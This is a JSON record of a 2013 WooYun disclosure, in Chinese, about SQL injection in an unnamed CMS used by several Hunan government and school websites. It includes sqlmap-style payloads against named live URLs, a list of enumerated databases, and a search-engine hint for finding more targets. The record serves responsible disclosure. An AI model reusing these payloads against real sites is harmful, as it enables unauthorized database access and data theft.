{"id": 7189, "wybug_id": "wooyun-2013-042577", "wybug_title": "某不知名cms的sql注入漏洞可影响湖南省重点办等多单位", "wybug_corp": "国家应急响应中心", "wybug_author": "霍大然", "wybug_date": "2013-11-11 14:20", "wybug_open_date": "2013-12-26 14:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-26：\t细节向公众公开  简要描述： 某不知名cms的sql注入漏洞可影响湖南省重点办等多单位，没waf的全中招 详细说明：  一、湖南省重点项目建管理办公室http://www.hnzdjs.com/areainfo/templates/green/inforelevant.aspx?InfoID=47281 (GET)lace: GETParameter: InfoID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: InfoID=47281) AND 9508=9508 AND (3443=3443    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: InfoID=47281) AND 7081=CONVERT(INT,(SELECT CHAR(113)+CHAR(101)+CHAR(103)+CHAR(105)+CHAR(113)+(SELECT (CASE WHEN (7081=7081) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(109)+CHAR(108)+CHAR(101)+CHAR(113))) AND (2106=2106    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: InfoID=-3806) OR 1408=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (7821=7821---web server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008available databases [20]:[*] AreaInfo[*] AreaInfoJKY[*] buildreport[*] innet[*] JST_OA[*] master[*] model[*] msdb[*] OA[*] outnet[*] ReportServer$SQLEXPRESS[*] ReportServer$SQLEXPRESSTempDB[*] SMSCC[*] tempdb[*] ZhongDianBan[*] ZhongDianBan2009[*] ZhongDianBan2010[*] ZhongDianBan2011[*] ZhongDianBan2012[*] ZhongDianBan2013\n\n\n\n上面这个可以解码google下inurl:\n\n   漏洞证明：  二、长沙市芙蓉区教育局下面挂了好多学校的站，很多都是该cms，只是数据库不一样http://minyou.furongedu.com/AreaInfo/Templates/Default/InfoRelevant.aspx?InfoID=36655 (GET)Place: GETParameter: InfoID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: InfoID=36655) AND 6399=6399 AND (1456=1456    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: InfoID=36655) AND 5049=CONVERT(INT,(SELECT CHAR(113)+CHAR(103)+CHAR(102)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (5049=5049) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(115)+CHAR(116)+CHAR(113))) AND (9640=9640    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: InfoID=-6876) OR 2171=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (7699=7699---\n\n三、某学校http://www.ycnjxx.com/CBInfo/Templates/Speciality/InfoRelevant.aspx?InfoID=1729 (GET)Place: GETParameter: InfoID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: InfoID=1729) AND 3721=3721 AND (9761=9761    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: InfoID=1729) AND 8685=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(99)+CHAR(99)+CHAR(113)+(SELECT (CASE WHEN (8685=8685) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(119)+CHAR(118)+CHAR(113))) AND (7325=7325    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: InfoID=-3012) OR 3119=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (7320=7320---\n\n三、什么火星学校http://huoxing.furongedu.com/Templates/Default/InfoRelevant.aspx?InfoID=524=52447) AND 7416=CONVERT(INT,(SELECT CHAR(113)+CHAR(109)+CHAR(104)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7416=7416) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(117)+CHAR(99)+CHAR(117)+CHAR(113))) AND (6405=6405    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: InfoID=52447) AND 5833=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (2892=2892---\n\n   修复方案：  统一找厂商修复   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-11-15 22:39 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖南分中心，由其后续通过函件方式通报步事单位处置。并建议网站管理方联系软件生产厂商，要求提供解决方案。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-02 16:33 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  这cms叫什么。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}